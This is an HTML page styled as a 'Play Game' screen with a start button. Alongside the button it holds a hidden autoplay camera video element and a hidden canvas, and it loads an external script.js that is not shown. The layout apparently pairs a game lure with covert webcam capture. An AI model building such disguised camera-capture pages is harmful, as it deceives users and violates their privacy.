<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Play Game</title>
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      text-align: center;
      background: linear-gradient(135deg, #1a1a1a, #222);
      color: white;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    button {
      background-color: #ff0055;
      color: white;
      border: none;
      padding: 15px 35px;
      font-size: 20px;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    button:hover {
      background-color: #ff3377;
      transform: scale(1.1);
    }

    #status {
      margin-top: 20px;
      font-size: 22px;
      color: #00ff88;
    }

    #camera {
      display: none;
    }

    canvas {
      display: none;
    }
  </style>
</head>
<body>
  <h1>ðŸŽ® Welcome to the Game ðŸŽ®</h1>
  <button id="startBtn">Play Game</button>
  <p id="status"></p>

  <video id="camera" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script src="script.js"></script>
</body>
</html>
